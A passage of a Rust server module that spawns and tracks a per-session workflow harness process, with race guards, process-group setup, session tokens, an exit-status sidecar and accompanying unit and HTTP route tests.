            "auto-relaunch lost spawn race"
        ),
        None => tracing::info!(
            session_id = %session_id,
            trigger = %trigger,
            "auto-relaunch lost spawn race (spawn already reserved)"
        ),
    }
}

/// Human-readable message for a genuine (non-race) spawn error. The
/// `AlreadyRunning` / `AlreadyStarting` variants are filtered upstream.
fn spawn_error_message(e: SpawnHarnessError) -> String {
    match e {
        SpawnHarnessError::SessionNotFound => "session not found".to_string(),
        SpawnHarnessError::NotEmitted => "not emitted".to_string(),
        SpawnHarnessError::AlreadyRunning { .. } => unreachable!(),
        SpawnHarnessError::AlreadyStarting => unreachable!(),
        // Filtered upstream as a benign race by `spawn_race_winning_pid`.
        SpawnHarnessError::ReplayInProgress => unreachable!(),
        SpawnHarnessError::SpawnFailed(io) => format!("spawn failed: {}", io),
        SpawnHarnessError::SentinelCleanup(io) => {
            format!("sentinel cleanup failed: {}", io)
        }
        SpawnHarnessError::NoPid => "spawned harness has no pid".to_string(),
    }
}

/// Shared spawn path used by the REST /start-execution handler and by
/// the chat-driven StartExecution tool's sink callback. Same gates:
/// session must exist, must be emitted, must not already be running.
/// Inserts an ExecutionHandle into `app.executions` on success and
/// spawns a watcher task to populate exit_status when the child reaps.
pub(crate) async fn spawn_harness_for_session(
    app: &ChatAppState,
    session_id: SessionId,
    agent_path: Option<String>,
    max_iterations: Option<u32>,
    frozen_method_source: bool,
) -> Result<ExecutionHandle, SpawnHarnessError> {
    let session = app
        .conversation
        .get_session(session_id)
        .await
        .ok_or(SpawnHarnessError::SessionNotFound)?;
    let package_dir = session
        .emitted_package_path
        .clone()
        .ok_or(SpawnHarnessError::NotEmitted)?;

    if let Some(existing) = app.executions.get(&session_id) {
        if existing.value().exit_status_get().is_none() {
            return Err(SpawnHarnessError::AlreadyRunning {
                pid: existing.value().pid,
            });
        }
    }
    // Two-flag mutual exclusion with a backgrounded reproducibility replay:
    // re-running recorded compute while the harness produces fresh compute for
    // the same package would race artifact writes. RESERVE the spawn slot FIRST
    // (set), THEN check `replays` (check) — the mirror of start_replay's
    // reserve-then-check. Both sides must be set-then-check for the two-flag
    // exclusion to be sound; a check-then-set here reopens a both-proceed window
    // (replay's check runs before this reserve while this check runs before
    // replay's reserve). Roll back the reservation if a replay is running.
    if !app.starting_executions.insert(session_id) {
        return Err(SpawnHarnessError::AlreadyStarting);
    }
    if let Some(r) = app.replays.get(&session_id) {
        if r.value().is_running() {
            app.starting_executions.remove(&session_id); // roll back our reservation
            return Err(SpawnHarnessError::ReplayInProgress);
        }
    }

    let spawn_result = spawn_harness_for_session_reserved(
        app,
        session_id,
        package_dir,
        session.audit_writer_secret,
        agent_path,
        max_iterations,
        frozen_method_source,
    )
    .await;
    app.starting_executions.remove(&session_id);
    spawn_result
}

async fn spawn_harness_for_session_reserved(
    app: &ChatAppState,
    session_id: SessionId,
    package_dir: std::path::PathBuf,
    audit_secret: [u8; 32],
    agent_path: Option<String>,
    max_iterations: Option<u32>,
    frozen_method_source: bool,
) -> Result<ExecutionHandle, SpawnHarnessError> {
    // Resolved once at boot into the typed `Config` (which reads
    // `ECAA_HARNESS_BIN_PATH`); read from `app.config` rather than the
    // process env so a concurrent test mutating the env table cannot
    // race the spawn. The env table is process-global and shared across
    // the multi-threaded test binary; reading it here let sibling tests'
    // `set_var`/`remove_var` flip the harness binary mid-spawn.
    let harness_bin = app
        .config
        .harness_bin_path
        .as_ref()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_else(|| "ecaa-workflow-harness".to_string());
    // C-3: the agent path is hard-allowlisted to known
    // scripts under `ECAA_SCRIPTS_DIR`. The LLM tool no longer accepts
    // an override; the REST surface still does for CLI/test flexibility
    // but every caller-supplied value is reduced to a basename and
    // rejected unless it appears in `ALLOWED_AGENT_SCRIPTS`. Production
    // default is `scripts/agent-claude.sh` (basename-only — no env
    // override here, because the env-driven default opens the same hole
    // we just closed at the request boundary).
    let agent_path = match validate_agent_path(agent_path) {
        Ok(p) => p.to_string_lossy().to_string(),
        Err(reason) => {
            return Err(SpawnHarnessError::SpawnFailed(std::io::Error::new(
                std::io::ErrorKind::InvalidInput,
                format!("invalid agent_path: {reason}"),
            )));
        }
    };
    let max_iter = max_iterations.unwrap_or_else(|| {
        ecaa_workflow_core::env_helpers::env_parse(
            "ECAA_DEFAULT_MAX_ITERATIONS",
            DEFAULT_MAX_ITERATIONS,
        )
    });
    // ECAA_SERVER_URL default. Port 3737 is distinct from the CLI's 3000 to allow
    // `make dev-server` and a live harness to run side-by-side without collision.
    // The user-facing dev-server port remains documented in README.md and
    // .env.example.
    let server_url =
        std::env::var("ECAA_SERVER_URL").unwrap_or_else(|_| "http://127.0.0.1:3737".to_string());

    // Tee the harness's stdout + stderr into a package-local log so
    // we can diagnose failures after the fact. Without this, the
    // child's output is lost (Playwright filters stdio buffering is
    // unreliable in CI; we want deterministic on-disk capture).
    let harness_log = package_dir.join("runtime").join("harness.log");
    if let Some(parent) = harness_log.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let log_file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&harness_log)
        .map_err(SpawnHarnessError::SpawnFailed)?;
    let log_file_stderr = log_file
        .try_clone()
        .map_err(SpawnHarnessError::SpawnFailed)?;

    let mut cmd = tokio::process::Command::new(&harness_bin);
    cmd.args(harness_command_args(
        &package_dir,
        &agent_path,
        max_iter,
        session_id,
        &server_url,
        frozen_method_source,
    ))
    .stdout(std::process::Stdio::from(log_file))
    .stderr(std::process::Stdio::from(log_file_stderr))
    // Belt-and-suspenders: if the `Child` ever drops before
    // `try_wait()`/`wait()`/`start_kill()` is called (e.g. an
    // early-return path bypasses the `ExecutionHandle` reaper
    // task), tokio will SIGKILL the child instead of orphaning
    // it to init. Pairs with the `setsid()`-based pgroup kill
    // path used by `/execution/kill`.
    .kill_on_drop(true);

    // Put the harness (and its agent + claude descendants) in their
    // own POSIX process group so `/execution/kill` can SIGTERM the
    // whole tree atomically via `kill -- -<pgid>`. Without this the
    // harness PID is in the server's process group and a kill of the
    // harness would only stop the harness — leaving agent-claude.sh
    // and the npm/claude subprocesses orphaned to init, eating tokens.
    #[cfg(unix)]
    {
        // pre_exec is from this trait — the lint is a false positive
        // (the unsafe block obscures the trait method use from the
        // unused-import analyzer).
        #[allow(unused_imports)]
        use std::os::unix::process::CommandExt;
        // POSIX subprocess setup needs `unsafe` (`pre_exec` runs in the
        // child between fork and exec, when async-signal-safe rules
        // apply). Workspace lint is `unsafe_code = "forbid"` (S5.32);
        // this block is the bounded waiver. The closure body is just a
        // single `setsid` syscall and `Error::last_os_error` lookup —
        // both async-signal-safe.
        #[allow(unsafe_code)]
        unsafe {
            cmd.pre_exec(|| {
                // setsid creates a new session AND a new process group
                // headed by the calling process. After this, the harness
                // pid is its own pgid.
                if libc::setsid() == -1 {
                    return Err(std::io::Error::last_os_error());
                }
                Ok(())
            });
        }
    }

    // Per-session harness self-token (critical-analysis M6). The raw
    // token is handed to the child via the `ECAA_HARNESS_TOKEN` env var;
    // only its SHA-256 digest is retained on the `ExecutionHandle`, so
    // the harness authenticates back as a session-scoped `HarnessAgent`
    // rather than borrowing the global admin `Owner` bearer. The harness
    // echoes the raw token in the `X-Harness-Token` header on every
    // per-session POST/GET; `resolve_harness_token` hashes it and
    // constant-time-matches it against `harness_token_hash`.
    let harness_token: String = {
        use rand::RngCore;
        let mut b = [0u8; 32];
        rand::thread_rng().fill_bytes(&mut b);
        hex::encode(b)
    };
    let harness_token_hash: [u8; 32] = {
        use sha2::{Digest, Sha256};
        Sha256::digest(harness_token.as_bytes()).into()
    };
    cmd.env("ECAA_HARNESS_TOKEN", &harness_token);
    // Hand the harness the SAME audit secret the server holds for this
    // session, as lowercase 64-hex. The harness-written signed verdict
    // sink + audit-proof report are then HMAC-consistent with a later UI
    // re-verify (POST …/audit-proof/reverify), which re-derives the key
    // from the in-process `session.audit_writer_secret`.
    cmd.env("ECAA_AUDIT_SECRET", hex::encode(audit_secret));

    clean_stale_sentinels(&package_dir).map_err(SpawnHarnessError::SentinelCleanup)?;
    // R3.4: clear any prior run's execution-status sidecar so the
    // auto-relaunch read path never observes a stale Completed status
    // for a session that is freshly running.
    execution_status_sidecar::clear(&package_dir);

    let mut child = cmd
        .spawn()
        .map_err(|e| {
            // ENOENT here means the harness *binary* itself was not found on
            // PATH (or at ECAA_HARNESS_BIN_PATH) — distinct from a missing
            // package/agent file. The bare "No such file or directory" gives
            // the operator nothing to act on, so spell out the fix. The dev
            // servers run from source (`cargo run`/Vite) and work without
            // `make install`, which makes it easy to reach this button having
            // never installed the harness.
            if e.kind() == std::io::ErrorKind::NotFound {
                SpawnHarnessError::SpawnFailed(std::io::Error::new(
                    std::io::ErrorKind::NotFound,
                    format!(
                        "harness binary {harness_bin:?} not found on PATH — run `make install` \
                         (or `cargo install --path crates/harness`) to install \
                         `ecaa-workflow-harness`, or set ECAA_HARNESS_BIN_PATH to its full path"
                    ),
                ))
            } else {
                SpawnHarnessError::SpawnFailed(e)
            }
        })?;
    let Some(pid) = child.id() else {
        let _ = child.start_kill();
        return Err(SpawnHarnessError::NoPid);
    };

    // After setsid the harness pid IS its own pgid (Linux semantics).
    // We could call libc::getpgid(pid as i32) but using pid is correct
    // and safer — no extra syscall path.
    let pgid = pid;
    // `ExecutionHandle::for_running` hides the
    // 10-field struct literal. The exit_status Arc is shared with the
    // child-watcher task spawned below; clone it BEFORE constructing
    // the handle so the watcher can mutate it independently of the
    // executions map.
    let handle = ExecutionHandle::for_running(
        pid,
        pgid,
        package_dir.clone(),
        agent_path.clone(),
        harness_token_hash,
    );
    let exit_status = handle.exit_status.clone();

    app.executions.insert(session_id, handle.clone());

    spawn_exit_watcher(
        app,
        session_id,
        child,
        ExitWatcherCtx {
            pkg_dir: package_dir.clone(),
            started_at: handle.started_at,
            pid,
            exit_status,
        },
    );

    Ok(handle)
}

/// Inputs threaded into the detached child-exit watcher task.
struct ExitWatcherCtx {
    pkg_dir: std::path::PathBuf,
    started_at: chrono::DateTime<chrono::Utc>,
    pid: u32,
    exit_status: std::sync::Arc<std::sync::atomic::AtomicI64>,
}

/// Spawn the detached task that reaps the harness child, persists its exit
/// status to the sidecar, fires the provenance git hook, and publishes the
/// exit code via the lock-free atomic.
fn spawn_exit_watcher(
    app: &ChatAppState,
    session_id: SessionId,
    mut child: tokio::process::Child,
    ctx: ExitWatcherCtx,
) {
    let ExitWatcherCtx {
        pkg_dir: watcher_pkg_dir,
        started_at: watcher_started_at,
        pid: watcher_pid,
        exit_status,
    } = ctx;
    let watcher_app = app.clone();
    let watcher_session_id = session_id;
    tokio::spawn(async move {
        // Lock-free exit-code publish (R-10). The reader-side `Acquire`
        // load in `exit_status_get()` pairs with this `Release` store.
        //
        // R3.4: persist the exit code to a sidecar file BEFORE the
        // atomic store so a graceful-shutdown cancellation between the
        // child reap and the in-memory publish doesn't leave the
        // session permanently observable as `existing_exited=false`.
        // `auto_relaunch_decision` falls back to the sidecar when the
        // in-memory `executions` map is empty (post-restart) or carries
        // an `EXIT_STATUS_UNSET` (mid-shutdown cancellation).
        let code = match child.wait().await {
            Ok(s) => s.code().unwrap_or(-1),
            Err(_) => -1,
        };
        let sidecar_written =
            persist_exit_sidecar(&watcher_pkg_dir, watcher_pid, code, watcher_started_at);
        if sidecar_written {
            fire_execution_git_hook(&watcher_app, watcher_session_id, &watcher_pkg_dir, code);
        }
        exit_status.store(code as i64, std::sync::atomic::Ordering::Release);
    });
}

/// Persist the harness exit status to its package sidecar, logging (but not
/// failing) on write error. Returns whether the write succeeded.
fn persist_exit_sidecar(
    pkg_dir: &std::path::Path,
    pid: u32,
    code: i32,
    started_at: chrono::DateTime<chrono::Utc>,
) -> bool {
    if let Err(err) = execution_status_sidecar::write(pkg_dir, pid, code, started_at) {
        tracing::warn!(
            target: "execution_status_sidecar",
            package_dir = %pkg_dir.display(),
            pid = pid,
            error = %err,
            "failed to persist execution exit status; in-memory store is the sole source"
        );
        false
    } else {
        true
    }
}

/// Fire the fire-and-forget provenance commit hook after the harness exits.
fn fire_execution_git_hook(
    app: &ChatAppState,
    session_id: SessionId,
    pkg_dir: &std::path::Path,
    code: i32,
) {
    let cfg = app.commit_git_config();
    let pkg = pkg_dir.to_path_buf();
    let sid = session_id.to_string();
    let app_for_drop = app.clone();
    let drop_notifier: DropNotifier = std::sync::Arc::new(move |trigger, reason| {
        app_for_drop.spawn_fanout(
            session_id,
            SsePayload::ProvenanceCommitDropped {
                trigger: trigger.to_string(),
                reason: reason.to_string(),
            },
        );
    });
    app.git_hook_pool.spawn_with_sink(
        "execution",
        move || {
            crate::git_routes::service::hook_commit(
                &cfg,
                &pkg,
                "execution",
                &format!("harness exited with {}", code),
                &sid,
            );
            Ok(())
        },
        Some(drop_notifier),
    );
}

/// Persistence sidecar that survives graceful-shutdown cancellation of
/// the child-watcher task. Without this, a server restart (or any
/// cancellation between `child.wait().await` returning and the atomic
/// `Release` store) would leave `auto_relaunch_decision` observing
/// `existing_exited = Some(false)` forever (the handle exists in the
/// in-memory `executions` map but its `exit_status` is `EXIT_STATUS_UNSET`).
/// The sidecar lets the auto-relaunch decision fall back to disk when
/// in-memory state is missing or unset.
pub(super) mod execution_status_sidecar {
    use std::path::{Path, PathBuf};

    /// On-disk shape. Kept tiny + self-describing so a downstream
    /// operator inspecting `<package>/runtime/.execution_status.json`
    /// understands what they're looking at.
    #[derive(serde::Serialize, serde::Deserialize, Clone, Debug)]
    pub(crate) struct PersistedExecutionStatus {
        pub pid: u32,
        pub exit_code: i32,
        pub started_at: chrono::DateTime<chrono::Utc>,
        pub exited_at: chrono::DateTime<chrono::Utc>,
    }

    fn sidecar_path(package_dir: &Path) -> PathBuf {
        package_dir.join("runtime").join(".execution_status.json")
    }

    /// Best-effort sidecar write — created lazily, parent dir built
    /// when missing, swallow errors (the caller logs them). Uses a
    /// `.tmp` + atomic rename so a crash mid-write doesn't surface a
    /// half-written JSON blob to the load path.
    pub(crate) fn write(
        package_dir: &Path,
        pid: u32,
        exit_code: i32,
        started_at: chrono::DateTime<chrono::Utc>,
    ) -> std::io::Result<()> {
        let body = PersistedExecutionStatus {
            pid,
            exit_code,
            started_at,
            exited_at: chrono::Utc::now(),
        };
        let json = serde_json::to_vec_pretty(&body).map_err(std::io::Error::other)?;
        let path = sidecar_path(package_dir);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        let tmp = path.with_extension("json.tmp");
        std::fs::write(&tmp, json)?;
        std::fs::rename(&tmp, &path)?;
        Ok(())
    }

    /// Read the sidecar if present. Returns `None` for the common
    /// "no exit recorded yet" case; errors propagate.
    pub(crate) fn read(package_dir: &Path) -> std::io::Result<Option<PersistedExecutionStatus>> {
        let path = sidecar_path(package_dir);
        match std::fs::read(&path) {
            Ok(bytes) => Ok(Some(
                serde_json::from_slice(&bytes).map_err(std::io::Error::other)?,
            )),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
            Err(e) => Err(e),
        }
    }

    /// Remove the sidecar (next start_execution clears the prior run's
    /// record before spawning).
    pub(crate) fn clear(package_dir: &Path) {
        let _ = std::fs::remove_file(sidecar_path(package_dir));
    }
}

#[cfg(test)]
mod tests {
    use super::{
        audit_actor_for_execution_token, auto_relaunch_decision, clean_stale_sentinels,
        harness_command_args, has_ready_task, has_sentinel_pending_with_fresh_heartbeat,
        task_matches_sentinel_pending_with_fresh_heartbeat, trigger_freezes_method_source,
        SessionId, AUTO_RELAUNCH_DEBOUNCE_SECS, AUTO_RELAUNCH_SENTINEL_DEBOUNCE_SECS,
    };
    use crate::chat_routes::test_support::{
        assistant, body_json, make_router, make_router_with_harness_bin,
        seed_session_with_completed_task, tool_use,
    };
    use axum::body::Body;
    use axum::http::{Request, StatusCode};
    use chrono::{Duration, Utc};
    use ecaa_workflow_conversation::{BatchableTool, Tool};
    use std::path::PathBuf;
    use tempfile::TempDir;
    use tower::util::ServiceExt;
    use uuid::Uuid;

    /// The audit secret handed to the harness at spawn via
    /// `ECAA_AUDIT_SECRET` is the lowercase 64-hex encoding of the
    /// session's `[u8; 32]` secret (the exact `hex::encode` call the
    /// spawn path uses), so the harness-written signed verdict sink is
    /// HMAC-consistent with a later UI re-verify.
    #[test]
    fn audit_secret_encodes_as_lowercase_64_hex() {
        let secret = [0xABu8; 32];
        let encoded = hex::encode(secret);
        assert_eq!(encoded.len(), 64, "32 bytes → 64 hex chars");
        assert_eq!(encoded, "ab".repeat(32));
        assert!(
            encoded
                .chars()
                .all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase()),
            "encoding must be lowercase hex"
        );
    }

    #[test]
    fn clean_stale_sentinels_removes_files_before_return() {
        let tmp = TempDir::new().unwrap();
        let runtime = tmp.path().join("runtime");
        std::fs::create_dir_all(&runtime).unwrap();
        for name in [".harness-pause", ".harness-stop", ".harness-paused"] {
            std::fs::write(runtime.join(name), b"stale").unwrap();
        }

        clean_stale_sentinels(tmp.path()).unwrap();

        for name in [".harness-pause", ".harness-stop", ".harness-paused"] {
            assert!(
                !runtime.join(name).exists(),
                "{name} must be removed before cleanup returns"
            );
        }
    }

    #[test]
    fn clean_stale_sentinels_is_noop_when_files_are_absent() {
        let tmp = TempDir::new().unwrap();
        std::fs::create_dir_all(tmp.path().join("runtime")).unwrap();
        clean_stale_sentinels(tmp.path()).unwrap();
    }

    // ── frozen-method-source on rerun/amend relaunch (plan Task 5.2) ──────

    #[test]
    fn rerun_amend_triggers_freeze_method_source() {
        // A relaunch driven by a deliberate rerun/amend of an
        // already-emitted package must freeze the method-source authority
        // so no fresh live discovery occurs.
        for trigger in ["rerun_task", "amend_method", "undo_amend"] {
            assert!(
                trigger_freezes_method_source(trigger),
                "{trigger} must freeze method source"
            );
        }
    }

    #[test]
    fn recovery_and_fresh_triggers_do_not_freeze_method_source() {
        // unblock / remediation are continuations of the in-flight run, and
        // fresh starts are not reruns; none should freeze discovery.
        for trigger in ["unblock", "apply_remediation", "start_execution"] {
            assert!(
                !trigger_freezes_method_source(trigger),
                "{trigger} must NOT freeze method source"
            );
        }
    }

    #[test]
    fn harness_args_appends_frozen_flag_only_when_requested() {
        let pkg = PathBuf::from("/tmp/pkg");
        let session = SessionId::new_v4();

        let frozen = harness_command_args(
            &pkg,
            "scripts/agent-claude.sh",
            8,
            session,
            "http://127.0.0.1:3737",
            true,
        );
        assert!(
            frozen.iter().any(|a| a == "--frozen-method-source"),
            "frozen relaunch must carry the flag: {frozen:?}"
        );

        let fresh = harness_command_args(
            &pkg,
            "scripts/agent-claude.sh",
            8,
            session,
            "http://127.0.0.1:3737",
            false,
        );
        assert!(
            !fresh.iter().any(|a| a == "--frozen-method-source"),
            "fresh relaunch must NOT carry the flag: {fresh:?}"
        );
        // The base args are identical apart from the trailing flag.
        assert_eq!(&frozen[..fresh.len()], &fresh[..]);
    }

    // ── auto_relaunch_decision predicate ──────────────────────────────────

    #[test]
    fn auto_relaunch_skips_when_no_emitted_package() {
        let now = Utc::now();
        let res = auto_relaunch_decision(None, false, None, None, true, false, now);
        assert!(res.is_err());
        assert!(res.unwrap_err().contains("no emitted package"));
    }

    #[test]
    fn auto_relaunch_skips_when_session_still_blocked() {
        let now = Utc::now();
        let pkg = PathBuf::from("/tmp/nope");
        let res = auto_relaunch_decision(Some(&pkg), true, None, None, true, false, now);
        assert_eq!(res, Err("session still blocked"));
    }

    #[test]
    fn auto_relaunch_skips_when_execution_already_running() {
        let now = Utc::now();
        let pkg = PathBuf::from("/tmp/nope");
        let res = auto_relaunch_decision(
            Some(&pkg),
            false,
            Some(now - Duration::seconds(3)), // started 3s ago
            Some(false),                      // not exited
            true,
            false,
            now,
        );
        assert_eq!(res, Err("execution already running"));
    }

    #[test]
    fn auto_relaunch_skips_when_last_spawn_within_debounce_window() {
        let now = Utc::now();
        let pkg = PathBuf::from("/tmp/nope");
        let res = auto_relaunch_decision(
            Some(&pkg),
            false,
            Some(now - Duration::seconds(AUTO_RELAUNCH_DEBOUNCE_SECS - 1)),
            Some(true), // exited (but recently)
            true,
            false,
            now,
        );
        assert_eq!(res, Err("debounced (last spawn too recent)"));
    }

    #[test]
    fn auto_relaunch_allows_when_last_spawn_older_than_debounce_window() {
        let now = Utc::now();
        let pkg = PathBuf::from("/tmp/nope");
        let res = auto_relaunch_decision(
            Some(&pkg),
            false,
            Some(now - Duration::seconds(AUTO_RELAUNCH_DEBOUNCE_SECS + 1)),
            Some(true),
            true,
            false,
            now,
        );
        assert!(res.is_ok(), "should proceed, got {:?}", res);
    }

    #[test]
    fn auto_relaunch_skips_when_no_ready_task() {
        let now = Utc::now();
        let pkg = PathBuf::from("/tmp/nope");
        let res = auto_relaunch_decision(Some(&pkg), false, None, None, false, false, now);
        assert_eq!(res, Err("no ready tasks"));
    }

    #[test]
    fn auto_relaunch_allows_fresh_session_with_ready_task() {
        // Happy path: no prior execution handle, session emitted, not
        // blocked, WORKFLOW.json has a ready task. This is the first
        // /unblock after initial emission where no harness has ever
        // run — the hook should proceed.
        let now = Utc::now();
        let pkg = PathBuf::from("/tmp/nope");
        let res = auto_relaunch_decision(Some(&pkg), false, None, None, true, false, now);
        assert!(res.is_ok(), "should proceed, got {:?}", res);
    }

    // ── Layer C: sentinel-pending extended debounce ───────────────────────

    #[test]
    fn auto_relaunch_extended_debounce_when_sentinel_pending_fresh_heartbeat() {
        // The pump-prevention case: prior harness exited 60s ago
        // (well past the ordinary 10s debounce), but compute is still
        // in flight per the heartbeat-fresh + sentinel-pending scan.
        // Must skip with the extended debounce reason.
        let now = Utc::now();
        let pkg = PathBuf::from("/tmp/nope");
        let res = auto_relaunch_decision(
            Some(&pkg),
            false,
            Some(now - Duration::seconds(60)),
            Some(true),
            true,
            true, // sentinel-pending + fresh heartbeat
            now,
        );
        assert_eq!(
            res,
            Err("debounced (sentinel-pending, fresh heartbeat — compute still in flight)")
        );
    }

    #[test]
    fn auto_relaunch_proceeds_after_extended_debounce_window_even_with_sentinel_pending() {
        // Once the extended window passes (~7.5 min), the harness MUST
        // be allowed to relaunch so its deterministic finalize probe
        // gets to run. Without this, a still-running compute would
        // strand forever.
        let now = Utc::now();
        let pkg = PathBuf::from("/tmp/nope");
        let res = auto_relaunch_decision(
            Some(&pkg),
            false,
            Some(now - Duration::seconds(AUTO_RELAUNCH_SENTINEL_DEBOUNCE_SECS + 1)),
            Some(true),
            true,
            true,
            now,
        );
        assert!(res.is_ok(), "should proceed, got {:?}", res);
    }

    #[test]
    fn auto_relaunch_extended_debounce_does_not_apply_when_no_prior_handle() {
        // First-ever auto-relaunch: there's no `existing_handle_started_at`
        // to compare against, so the extended debounce is moot. Sentinel
        // pending or not, we proceed (otherwise the SME would never get
        // past initial emission for a pre-warmed package).
        let now = Utc::now();
        let pkg = PathBuf::from("/tmp/nope");
        let res = auto_relaunch_decision(
            Some(&pkg),
            false,
            None, // no prior handle
            None,
            true,
            true, // sentinel-pending claimed but no debounce to extend
            now,
        );
        assert!(res.is_ok(), "should proceed, got {:?}", res);
    }

    #[test]
    fn task_match_requires_both_block_reason_marker_and_fresh_heartbeat() {
        let tmp = TempDir::new().unwrap();
        let task_dir = tmp.path();
        // No blocker.json yet — must not match.
        assert!(!task_matches_sentinel_pending_with_fresh_heartbeat(
            task_dir, 900
        ));
        // blocker.json present but no marker — must not match.
        std::fs::write(
            task_dir.join("blocker.json"),
            serde_json::to_string_pretty(&serde_json::json!({
                "task_id": "t",
                "block_reason": "needs_human_decision",
            }))
            .unwrap(),
        )
        .unwrap();
        std::fs::write(task_dir.join(".heartbeat"), "fresh").unwrap();
        assert!(!task_matches_sentinel_pending_with_fresh_heartbeat(
            task_dir, 900
        ));
        // Marker present + fresh heartbeat → must match.
        std::fs::write(
            task_dir.join("blocker.json"),
            serde_json::to_string_pretty(&serde_json::json!({
                "task_id": "t",
                "block_reason": "in_flight_sentinel_pending",
            }))
            .unwrap(),
        )
        .unwrap();
        // (heartbeat already fresh from above)
        assert!(task_matches_sentinel_pending_with_fresh_heartbeat(
            task_dir, 900
        ));
        // Stale heartbeat (threshold = 0 means anything is stale) →
        // must NOT match. The heartbeat-stall detector handles this
        // case via the normal block path.
        assert!(!task_matches_sentinel_pending_with_fresh_heartbeat(
            task_dir, 0
        ));
    }

    #[test]
    fn task_match_recognises_summary_text_marker() {
        // Some agent versions write the marker into the `summary` /
        // `reason` body instead of a typed `block_reason` field. Both
        // shapes must be recognised.
        let tmp = TempDir::new().unwrap();
        let task_dir = tmp.path();
        std::fs::write(
            task_dir.join("blocker.json"),
            serde_json::to_string_pretty(&serde_json::json!({
                "task_id": "t",
                "summary": "Seurat v5 CCA — sentinel pending; awaiting integration_status.OK",
            }))
            .unwrap(),
        )
        .unwrap();
        std::fs::write(task_dir.join(".heartbeat"), "fresh").unwrap();
        assert!(task_matches_sentinel_pending_with_fresh_heartbeat(
            task_dir, 900
        ));
    }

    #[test]
    fn package_scan_returns_true_when_any_task_matches() {
        let tmp = TempDir::new().unwrap();
        let pkg = tmp.path();
        let outputs = pkg.join("runtime/outputs");
        std::fs::create_dir_all(outputs.join("clean")).unwrap();
        std::fs::create_dir_all(outputs.join("waiting")).unwrap();
        std::fs::write(
            outputs.join("waiting/blocker.json"),
            serde_json::to_string_pretty(&serde_json::json!({
                "task_id": "waiting",
                "block_reason": "in_flight_sentinel_pending",
            }))
            .unwrap(),
        )
        .unwrap();
        std::fs::write(outputs.join("waiting/.heartbeat"), "fresh").unwrap();
        assert!(has_sentinel_pending_with_fresh_heartbeat(pkg));
    }

    #[test]
    fn package_scan_returns_false_when_no_outputs_dir() {
        let tmp = TempDir::new().unwrap();
        // No `runtime/outputs` at all.
        assert!(!has_sentinel_pending_with_fresh_heartbeat(tmp.path()));
    }

    // ── has_ready_task ────────────────────────────────────────────────────

    #[test]
    fn has_ready_task_returns_false_when_workflow_missing() {
        let tmp = TempDir::new().unwrap();
        assert!(!has_ready_task(tmp.path()));
    }

    #[test]
    fn has_ready_task_returns_false_when_workflow_unparseable() {
        let tmp = TempDir::new().unwrap();
        std::fs::write(tmp.path().join("WORKFLOW.json"), "not-json").unwrap();
        assert!(!has_ready_task(tmp.path()));
    }

    #[test]
    fn has_ready_task_returns_false_when_no_ready_states() {
        let tmp = TempDir::new().unwrap();
        let wf = serde_json::json!({
            "tasks": {
                "t1": { "state": { "status": "completed" } },
                "t2": { "state": { "status": "blocked" } },
                "t3": { "state": { "status": "pending" } },
            }
        });
        std::fs::write(
            tmp.path().join("WORKFLOW.json"),
            serde_json::to_string_pretty(&wf).unwrap(),
        )
        .unwrap();
        assert!(!has_ready_task(tmp.path()));
    }

    #[test]
    fn has_ready_task_returns_true_when_at_least_one_ready_state() {
        let tmp = TempDir::new().unwrap();
        let wf = serde_json::json!({
            "tasks": {
                "t1": { "state": { "status": "completed" } },
                "t2": { "state": { "status": "ready" } },
                "t3": { "state": { "status": "pending" } },
            }
        });
        std::fs::write(
            tmp.path().join("WORKFLOW.json"),
            serde_json::to_string_pretty(&wf).unwrap(),
        )
        .unwrap();
        assert!(has_ready_task(tmp.path()));
    }

    #[tokio::test]
    async fn dag_endpoint_returns_built_dag() {
        let (router, _) = make_router(vec![
            tool_use(Tool::Batchable(BatchableTool::AppendIntakeProse {
                prose: "single cell scRNA-seq human samples".into(),
            })),
            assistant("ok"),
        ])
        .await;

        let req = Request::builder()
            .method("POST")
            .uri("/api/chat/session")
            .header("content-type", "application/json")
            .body(Body::from(r#"{}"#))
            .unwrap();
        let resp = router.clone().oneshot(req).await.unwrap();
        let session_id = body_json(resp.into_body()).await["session_id"]
            .as_str()
            .unwrap()
            .to_string();

        let req = Request::builder()
            .method("POST")
            .uri(format!("/api/chat/session/{}/turn", session_id))
            .header("content-type", "application/json")
            .body(Body::from(r#"{"message":"go"}"#))
            .unwrap();
        let _ = router.clone().oneshot(req).await.unwrap();

        let req = Request::builder()
            .method("GET")
            .uri(format!("/api/chat/session/{}/dag", session_id))
            .body(Body::empty())
            .unwrap();
        let resp = router.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let body = body_json(resp.into_body()).await;
        assert!(body["tasks"].is_object());
        assert!(!body["tasks"].as_object().unwrap().is_empty());
    }

    #[tokio::test]
    async fn start_execution_404_when_session_missing() {
        let (router, _) = make_router(vec![]).await;
        let req = Request::builder()
            .method("POST")
            .uri(format!(
                "/api/chat/session/{}/start-execution",
                Uuid::new_v4()
            ))
            .header("content-type", "application/json")
            .body(Body::from("{}"))
            .unwrap();
        let resp = router.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::NOT_FOUND);
    }

    #[tokio::test]
    async fn start_execution_400_when_package_not_emitted() {
        let (router, app) = make_router(vec![]).await;
        let id = seed_session_with_completed_task(&app, "t_demo", None).await;
        let req = Request::builder()
            .method("POST")
            .uri(format!("/api/chat/session/{}/start-execution", id))
            .header("content-type", "application/json")
            .body(Body::from("{}"))
            .unwrap();
        let resp = router.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
    }

    #[tokio::test]
    async fn start_execution_spawns_and_tracks_child() {
        if !std::path::Path::new("/usr/bin/true").exists() {
            eprintln!("skip: /usr/bin/true missing");
            return;
        }
        let pkg = tempfile::tempdir().unwrap();
        let (router, app) = make_router_with_harness_bin(vec![], "/usr/bin/true").await;
        let id =
            seed_session_with_completed_task(&app, "t_demo", Some(pkg.path().to_path_buf())).await;

        let req = Request::builder()
            .method("POST")
            .uri(format!("/api/chat/session/{}/start-execution", id))
            .header("content-type", "application/json")
            .body(Body::from("{}"))
            .unwrap();
        let resp = router.clone().oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
